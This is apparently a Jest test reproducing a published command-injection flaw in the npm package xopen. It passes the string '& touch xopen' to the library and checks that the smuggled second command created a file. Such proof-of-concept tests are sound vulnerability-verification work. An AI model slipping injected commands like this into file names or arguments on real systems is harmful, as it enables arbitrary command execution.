//https://snyk.io/vuln/SNYK-JS-XOPEN-1050981
test("Command Injection in xopen", () => {
  const root = require("xopen");
  const fs = require("fs");
  const path = "./xopen";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let attack_code = "& touch xopen";
  root(attack_code);
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
